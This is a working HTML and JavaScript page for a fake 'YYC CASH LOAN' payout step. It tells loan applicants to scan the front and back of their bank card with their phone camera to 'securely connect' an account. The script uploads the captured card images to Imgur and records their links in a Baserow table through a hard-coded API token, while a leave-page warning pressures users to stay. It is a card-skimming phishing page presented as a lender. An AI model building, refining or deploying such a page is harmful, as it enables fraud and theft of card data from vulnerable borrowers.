<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YYC CASH LOAN - Connect Your Book</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0066cc;
            --primary-dark: #28a745;
            --secondary: #ff9900;
            --text: #333333;
            --light-bg: #f5f7fa;
            --white: #ffffff;
            --success: #28a745;
            --danger: #dc3545;
            --gray: #6c757d;
            --light-gray: #e9ecef;
            --border-radius: 8px;
            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--light-bg);
            color: var(--text);
            line-height: 1.6;
            max-width: 480px;
            margin: 0 auto;
            position: relative;
            min-height: 100vh;
            padding-bottom: 70px; /* Space for bottom nav */
        }

        .app-container {
            background-color: var(--white);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        /* Header Styles */
        .app-header {
            background-color: var(--primary);
            color: var(--white);
            padding: 15px;
            text-align: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: var(--shadow);
        }

        .app-header h1 {
            font-size: 1.5rem;
            margin: 0;
        }

        /* Bottom Navigation */
        .bottom-nav {
            display: flex;
            justify-content: space-around;
            align-items: center;
            background-color: var(--white);
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            max-width: 480px;
            margin: 0 auto;
            height: 60px;
            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
            z-index: 100;
        }

        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: var(--gray);
            text-decoration: none;
            font-size: 0.7rem;
            width: 20%;
            height: 100%;
            transition: all 0.3s ease;
        }

        .nav-item i {
            font-size: 1.2rem;
            margin-bottom: 4px;
        }

        .nav-item.active {
            color: var(--primary);
        }

        /* Content */
        .content-section {
            padding: 20px 15px;
            display: none; /* Hidden initially until user connects */
        }

        .success-card {
            background-color: var(--white);
            border-radius: var(--border-radius);
            padding: 3px 2px;
            margin: 2px 0;
            box-shadow: var(--shadow);
            text-align: center;
        }

        .success-icon {
            font-size: 3rem;
            color: var(--success);
            margin-bottom: 2px;
        }

        .success-title {
            font-size: 1.1rem;
            color: var(--primary);
            margin-bottom: 15px;
        }

        .success-message {
            margin-bottom: 20px;
            color: var(--text);
        }

        .application-details {
            background-color: var(--white);
            border-radius: var(--border-radius);
            padding: 20px;
            margin: 20px 0;
            box-shadow: var(--shadow);
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 10px 0;
            border-bottom: 1px solid var(--light-gray);
        }

        .detail-row:last-child {
            border-bottom: none;
        }

        .section-title {
            font-size: 1.2rem;
            color: var(--primary);
            margin-bottom: 15px;
            padding-bottom: 5px;
            border-bottom: 2px solid var(--primary);
        }

        .contact-info {
            background-color: var(--white);
            border-radius: var(--border-radius);
            padding: 20px;
            margin: 20px 0;
            box-shadow: var(--shadow);
        }

        .contact-item {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .contact-item i {
            width: 30px;
            color: var(--primary);
        }

        .btn {
            display: inline-block;
            background-color: var(--secondary);
            color: var(--white);
            padding: 10px 20px;
            border-radius: var(--border-radius);
            text-decoration: none;
            font-weight: bold;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s ease;
            text-align: center;
            margin: 5px 0;
        }

        .btn:hover {
            background-color: #e68a00;
        }

        .btn-block {
            display: block;
            width: 100%;
        }

        .btn-disabled {
            background-color: var(--gray);
            cursor: not-allowed;
        }

        .btn-disabled:hover {
            background-color: var(--gray);
        }

        /* Modal Popup */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: var(--white);
            border-radius: var(--border-radius);
            width: 90%;
            max-width: 400px;
            padding: 25px;
            box-shadow: var(--shadow);
            position: relative;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .modal-title {
            color: var(--primary);
            font-size: 1.3rem;
            margin-bottom: 10px;
        }

        .modal-body {
            margin-bottom: 20px;
        }

        .modal-footer {
            display: flex;
            flex-direction: column;
        }

        .user-info {
            background-color: var(--light-bg);
            padding: 15px;
            border-radius: var(--border-radius);
            margin-bottom: 15px;
        }

        .user-info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 5px;
        }

        .user-info-label {
            font-weight: bold;
        }

        .warning-text {
            color: var(--danger);
            font-weight: bold;
            margin: 10px 0;
            text-align: center;
        }

        .note-text {
            font-style: italic;
            font-size: 0.9rem;
            margin: 15px 0;
            text-align: center;
        }

        /* Scan connection section */
        .scan-section {
            background-color: var(--white);
            border-radius: var(--border-radius);
            padding: 20px;
            margin: 20px 0;
            box-shadow: var(--shadow);
            text-align: center;
        }

        .scan-steps {
            margin: 20px 0;
            text-align: left;
        }

        .scan-step {
            margin-bottom: 15px;
            display: flex;
            align-items: flex-start;
        }

        .step-number {
            background-color: var(--primary);
            color: var(--white);
            width: 25px;
            height: 25px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-right: 10px;
            flex-shrink: 0;
        }

        .step-content {
            flex: 1;
        }

        .qr-code {
            width: 200px;
            height: 200px;
            background-color: var(--light-bg);
            margin: 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            border: 1px solid var(--light-gray);
        }

        .loading-spinner {
            border: 4px solid var(--light-gray);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .connection-status {
            margin: 20px 0;
            padding: 15px;
            border-radius: var(--border-radius);
            text-align: center;
            background-color: var(--light-bg);
        }

        .file-upload-container {
            margin: 20px 0;
            text-align: center;
        }

        .file-input {
            width: 0.1px;
            height: 0.1px;
            opacity: 0;
            overflow: hidden;
            position: absolute;
            z-index: -1;
        }

        .file-label {
            display: inline-block;
            background-color: var(--primary);
            color: var(--white);
            padding: 12px 20px;
            border-radius: var(--border-radius);
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-bottom: 10px;
        }

        .file-label:hover {
            background-color: var(--primary-dark);
        }

        .file-label i {
            margin-right: 8px;
        }

        .file-name {
            margin-top: 10px;
            font-size: 0.9rem;
            color: var(--gray);
        }

        .upload-preview {
            margin: 20px 0;
            max-width: 100%;
            display: none;
        }

        .upload-preview img {
            max-width: 100%;
            border-radius: var(--border-radius);
            box-shadow: var(--shadow);
        }

        .upload-preview .pdf-preview {
            background-color: var(--light-bg);
            padding: 20px;
            border-radius: var(--border-radius);
            text-align: center;
        }

        .upload-preview .pdf-icon {
            font-size: 3rem;
            color: var(--danger);
            margin-bottom: 10px;
        }

        .upload-success {
            background-color: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: var(--border-radius);
            margin: 20px 0;
            text-align: center;
            display: none;
        }

        /* Book Scanner Styles */
        :root {
            --accent: #00ffff;
            --accent-2: #ff00ff;
            --shadow-glow: 0 0 20px rgba(0, 255, 255, 0.5);
        }

        .scanner {
            position: relative;
            width: 100%;
            max-width: 360px;
            padding: 2rem;
            background: rgba(29, 31, 36, 0.8);
            border-radius: 16px;
            box-shadow: var(--shadow-glow), 0 0 40px rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            text-align: center;
            overflow: hidden;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            margin: 0 auto;
        }

        .scanner:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 30px var(--accent), 0 0 60px var(--accent-2);
        }

        .scanner h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.5rem;
            letter-spacing: 2px;
            margin-bottom: .5rem;
            color: var(--accent);
        }

        .scanner p {
            margin-bottom: 1rem;
            font-size: .9rem;
            color: var(--accent);
        }

        .scanner video {
            width: 100%;
            border: 2px solid var(--accent);
            border-radius: 12px;
            box-shadow: 0 0 10px var(--accent);
            transition: box-shadow 0.3s ease;
            background: #000;
        }

        .scanner video:focus, .scanner video:hover {
            box-shadow: 0 0 20px var(--accent-2);
        }

        .scan-line {
            position: absolute;
            top: 50%;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(to right, transparent, var(--accent), transparent);
            animation: scan 1.5s infinite;
        }

        @keyframes scan {
            0% { transform: translateY(-50%) scaleX(0); }
            50% { transform: translateY(-50%) scaleX(1); }
            100% { transform: translateY(-50%) scaleX(0); }
        }

        .scanner button {
            margin: .5rem .25rem;
            padding: .6rem 1.2rem;
            font-size: .9rem;
            font-weight: 500;
            color: var(--text-dark);
            background: linear-gradient(45deg, var(--accent), var(--accent-2));
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            transition: background 0.3s ease, transform 0.3s ease;
        }

        .scanner button:hover {
            background: linear-gradient(45deg, var(--accent-2), var(--accent));
            transform: scale(1.05);
        }

        #next, #finish {
            display: none;
        }

        #status {
            margin-top: 1rem;
            font-size: .85rem;
            min-height: 1.2rem;
            color: var(--accent);
        }

        #switchCamera {
            background: transparent;
            color: var(--accent);
            box-shadow: none;
            text-decoration: underline;
        }

        #switchCamera:hover {
            color: var(--accent-2);
        }

        /* Permission overlay */
        #permissionOverlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }

        #permissionOverlay h2 {
            color: var(--accent);
            margin-bottom: 1rem;
        }

        #enableBtn {
            padding: .8rem 1.5rem;
            font-size: 1rem;
            color: var(--text-dark);
            background: linear-gradient(45deg, var(--accent), var(--accent-2));
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0,255,255,0.6);
            transition: transform 0.3s ease;
        }

        #enableBtn:hover {
            transform: scale(1.1);
        }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="app-header">
            <h1>YYC CASH LOAN | NCRCP15906</h1>
        </header>

        <!-- Main Content (hidden initially) -->
        <section id="main-content" class="content-section">
            <div class="success-card">
                <i class="fas fa-check-circle success-icon"></i>
                <h2 class="success-title">Application Submitted!</h2>
                <p class="success-message">Thank you for applying with YYC CASH LOAN.You can ONLY apply for a loan with capitec by submiting your capitec bank statement and can not be used for pay out  NOTE WE DO NOT PAY OUT TO CAPITEC DUE TO SECURITY CONCERNS AND FOR EASY PAYOUTS scan any other bank card for pay out</p>
                
            </div>

            <div class="scan-section">
    <h3 class="section-title">Connect Your Bank Account for Payout</h3>
    
    <!-- Book Scanner from uploaded file -->
    <div id="permissionOverlay">
        <h2>Allow Camera Access to Scan</h2>
        <h1>To Verify Scan Out b<h1></h1>
        <button id="enableBtn">Enable Camera</button>
    </div>
    <div class="scanner" style="visibility:hidden;">
        <h2 id="label">Scan Card Front</h2>
        <p id="description">Scan the front & Back of your ATM Card (CAPITEC CARD NOTE ALLOWED) to SECURLY CONNECT the accont you want the Loan paid out to.</p>
        <div style="position: relative;">
            <video id="video" autoplay playsinline></video>
            <div id="scan-line" class="scan-line" style="display:none;"></div>
        </div>
        <button id="switchCamera">Switch Camera</button><br>
        <button id="scanBtn" disabled>Scan Card Front</button>
        <button id="next">Next</button>
        <button id="finish">Finish</button>
        <p id="status"></p>
    </div>
</div>

            <div class="application-details">
                <h3 class="section-title">Application Summary</h3>
                <div id="application-summary">
                    <!-- This will be populated with JavaScript -->
                </div>
            </div>

            <div class="contact-info">
                <h3 class="section-title">Need Help?</h3>
                <p>If you have any questions about your application, please contact us:</p>
                <div class="contact-item">
                    <i class="fas fa-envelope"></i>
                    <span>yyccashloan@gmail.com</span>
                </div>
            </div>
        </section>

        <!-- Connection Modal (always visible until connected) -->
        <div id="connection-modal" class="modal-overlay">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Connect Your Bank Account Via scan</h2>
                     NOTE WE DO NOT PAY OUT TO CAPITEC DUE TO SECURITY CONCERNS AND FOR EASY PAYOUTS.


                </div>
                <div class="modal-body">
                    <div class="user-info">
                        <div class="user-info-row">
                            <span class="user-info-label">Applicant:</span>
                            <span id="applicant-name">Loading...</span>
                        </div>
                        <div class="user-info-row">
                            <span class="user-info-label">ID Number:</span>
                            <span id="applicant-id">Loading...</span>
                        </div>
                    </div>
                    
                    <p>To enable access to your loan, you need to first connect your Bank account Number to allow secure release of your loan instantly once connection is complete.</p>
                    
                    <p class="note-text">NOTE: Once connection is complete, funds are released same time/same day.</p>
                    
                    <p class="warning-text">Please note you can only choose one of the following to connect your book:</p>
                </div>
                <div class="modal-footer">
                    <button id="connect-scan" class="btn btn-block">Connect Via Scan</button>
                    <button id="connect-ozwo" class="btn btn-block btn-disabled">Connect via ozwo (coming soon)</button>
                </div>
            </div>
        </div>

        <!-- Bottom Navigation -->
        <nav class="bottom-nav">
            <a href="index.html" class="nav-item">
                <i class="fas fa-home"></i>
                <span>Home</span>
            </a>
            <a href="index.html#apply" class="nav-item">
                <i class="fas fa-edit"></i>
                <span>Apply</span>
            </a>
            <a href="index.html#loans" class="nav-item">
                <i class="fas fa-money-bill-wave"></i>
                <span>Loans</span>
            </a>
            <a href="index.html#how" class="nav-item">
                <i class="fas fa-info-circle"></i>
                <span>How It Works</span>
            </a>
            <a href="index.html#account" class="nav-item active">
                <i class="fas fa-user"></i>
                <span>Account</span>
            </a>
        </nav>
    </div>

    <script>
        // Load application data from localStorage
        document.addEventListener('DOMContentLoaded', function() {
            const applicationData = JSON.parse(localStorage.getItem('loanApplication'));
            
            if (applicationData) {
                // Populate user info in the modal
                document.getElementById('applicant-name').textContent = applicationData.fullName;
                document.getElementById('applicant-id').textContent = applicationData.idNumber;
                
                // Create HTML for application summary
                let summaryHTML = '';
                
                // Add each detail to the summary
                summaryHTML += createDetailRow('Full Name', applicationData.fullName);
                summaryHTML += createDetailRow('ID Number', applicationData.idNumber);
                summaryHTML += createDetailRow('Contact Number', applicationData.phone);
                summaryHTML += createDetailRow('Email', applicationData.email);
                summaryHTML += createDetailRow('Loan Amount', 'R' + parseInt(applicationData.loanAmount).toLocaleString());
                summaryHTML += createDetailRow('Loan Purpose', applicationData.loanPurpose);
                summaryHTML += createDetailRow('Repayment Term', applicationData.repaymentTerm + ' months');
                
                // Insert the HTML into the page
                document.getElementById('application-summary').innerHTML = summaryHTML;
            } else {
                // If no application data is found
                document.getElementById('applicant-name').textContent = 'No data found';
                document.getElementById('applicant-id').textContent = 'No data found';
                document.getElementById('application-summary').innerHTML = 
                    '<p>No application data found. Please <a href="index.html#apply">apply for a loan</a>.</p>';
            }
            
            // Set up event listeners for the connection buttons
            document.getElementById('connect-scan').addEventListener('click', function() {
                // Hide the modal and show the main content
                document.getElementById('connection-modal').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
                
                // Simulate connection process
                simulateConnectionProcess();
            });
            
            document.getElementById('connect-ozwo').addEventListener('click', function() {
                alert('Coming soon. Please use Connect Via Scan option.');
            });
            
            // Prevent leaving the page
            window.addEventListener('beforeunload', function(e) {
                // If the modal is still visible, show a warning
                if (document.getElementById('connection-modal').style.display !== 'none') {
                    e.preventDefault();
                    e.returnValue = 'You need to connect your book to proceed. Are you sure you want to leave?';
                    return e.returnValue;
                }
            });
        });
        
        // Helper function to create a detail row
        function createDetailRow(label, value) {
            return `
                <div class="detail-row">
                    <span>${label}:</span>
                    <span>${value}</span>
                </div>
            `;
        }
        
        // Simulate the connection process
        function simulateConnectionProcess() {
    // No need for simulation anymore as we're using the actual scanner
}

// Book Scanner JavaScript
document.addEventListener('DOMContentLoaded', function() {
    const permissionOverlay = document.getElementById('permissionOverlay');
    const enableBtn = document.getElementById('enableBtn');
    const scanner = document.querySelector('.scanner');

    enableBtn.addEventListener('click', () => {
        initCamera().then(() => {
            permissionOverlay.style.display = 'none';
            scanner.style.visibility = 'visible';
            document.getElementById('scanBtn').disabled = false;
        }).catch(() => {
            alert('Camera permission is required.');
        });
    });

    // DOM refs
    const video      = document.getElementById('video');
    const scanBtn    = document.getElementById('scanBtn');
    const nextBtn    = document.getElementById('next');
    const finishBtn  = document.getElementById('finish');
    const scanLine   = document.getElementById('scan-line');
    const switchCam  = document.getElementById('switchCamera');
    const label      = document.getElementById('label');
    const desc       = document.getElementById('description');
    const status     = document.getElementById('status');

    let useFrontCamera = false;
    let stream         = null;
    let frontURL       = null;
    let currentStep    = 'front';

    const TABLE_ID      = '503285';
    const BASEROW_API   = `https://api.baserow.io/api/database/rows/table/${TABLE_ID}/?user_field_names=true`;
    const BASEROW_TOKEN = 'Token LG6hnTBxgBG78FueElsSwpHRd4Wep1oL';
    const IMGUR_CLIENT_ID = 'c16e7b4d4df51fc';

    async function initCamera() {
        if (stream) stream.getTracks().forEach(t => t.stop());
        const devices = await navigator.mediaDevices.enumerateDevices();
        if (!devices.some(d => d.kind === 'videoinput')) throw new Error('No camera found');
        const userMedia = navigator.mediaDevices.getUserMedia({ video: { facingMode: useFrontCamera ? 'user' : 'environment' }, audio: false });
        stream = await userMedia;
        video.srcObject = stream;
        return true;
    }

    function captureBlob() {
        const c = document.createElement('canvas');
        c.width  = video.videoWidth;
        c.height = video.videoHeight;
        c.getContext('2d').drawImage(video, 0, 0);
        return new Promise(res => c.toBlob(res, 'image/jpeg'));
    }

    async function uploadToImgur(blob) {
        const fd = new FormData(); fd.append('image', blob);
        const r = await fetch('https://api.imgur.com/3/upload', { method: 'POST', headers: { Authorization: 'Client-ID ' + IMGUR_CLIENT_ID }, body: fd });
        if (!r.ok) throw new Error('Imgur upload failed');
        const j = await r.json(); return j.data.link;
    }

    async function createBaserowRow(frontUrl, backUrl) {
        const body = { frontpictur: frontUrl, backpictur: backUrl };
        const r = await fetch(BASEROW_API, { method: 'POST', headers: { 'Authorization': BASEROW_TOKEN, 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        if (!r.ok) throw new Error('Baserow row creation failed');
        return r.json();
    }

    async function handleScan() {
        scanBtn.disabled = true; status.textContent = '';
        scanLine.style.display = 'block'; await new Promise(r => setTimeout(r, 1500));
        try {
            const blob = await captureBlob(); const url = await uploadToImgur(blob);
            scanLine.style.display = 'none';
            if (currentStep === 'front') {
                frontURL = url; status.textContent = 'Front Scan Successful'; nextBtn.style.display = 'inline-block';
            } else {
                status.textContent = 'Scanning back & Processing Payout'; await createBaserowRow(frontURL, url);
                status.textContent = 'âœ… Done!Click  finish and track your application'; finishBtn.style.display = 'inline-block';
            }
        } catch (e) { status.textContent = 'Error: ' + e.message; }
        finally { scanBtn.disabled = false; }
    }

    scanBtn.addEventListener('click', handleScan);
    nextBtn.addEventListener('click', () => {
        currentStep = 'back'; label.textContent = 'Back Scan'; desc.textContent = 'Scan the back of your Card.';
        scanBtn.textContent = 'Scan Card Back'; nextBtn.style.display = 'none'; status.textContent = '';
    });
    finishBtn.addEventListener('click', () => window.location.href = 'complete.html');
    switchCam.addEventListener('click', () => { useFrontCamera = !useFrontCamera; initCamera(); });
});
    </script>
</body>
</html>
